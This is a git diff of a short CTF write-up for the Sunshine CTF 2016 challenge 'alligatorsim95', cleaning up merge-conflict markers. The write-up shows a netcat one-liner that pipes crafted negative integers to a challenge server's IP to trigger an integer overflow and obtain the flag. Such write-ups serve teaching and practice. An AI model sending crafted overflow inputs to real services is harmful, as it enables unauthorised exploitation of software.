@@ -5,7 +5,6 @@ tags:    [Write-up, Sunshine CTF 2016]
 summary: "Write-up about Sunshine CTF 2016 - alligatorsim95"
 ---
 
-<<<<<<< HEAD
 In this challenge, we need to connect to a server through Netcat. Let is do it with `nc 4.31.182.242 9000`. A message appears.
 
 ```
@@ -31,10 +30,6 @@ In this challenge, we need to connect to a server through Netcat. Let is do it w
 After digging we can see that the program can accept any values, especially negative values. This is surely a way to perform [integer overflows](https://en.wikipedia.org/wiki/Integer_overflow). By a simple command in Python we can find the flag: `python -c "print -1337; print -0xffffffff; print -1" | nc 4.31.182.242 9000`. We will have the following message:
 
 ```
-=======
-```
-➜  Desktop python -c "print -1337; print -0xffffffff; print -1" | nc 4.31.182.242 9000 # integer underflow
->>>>>>> cc4fa00a9b202369df3fe4638bac04814b41e9db
               .-._   _ _ _ _ _ _ _ _
    .-''-.__.-'00  '-' ' ' ' ' ' ' ' '-.
   '.___ '    .   .--_'-' '-' '-' _'-' '._
@@ -60,8 +55,5 @@ After digging we can see that the program can accept any values, especially nega
 -> as a god among gators here is ur crown:
 sun{int_0verflow_i5_a_g0od_st4rt}
 ```
-<<<<<<< HEAD
 
 The flag is `sun{int_0verflow_i5_a_g0od_st4rt}`.
-=======
->>>>>>> cc4fa00a9b202369df3fe4638bac04814b41e9db
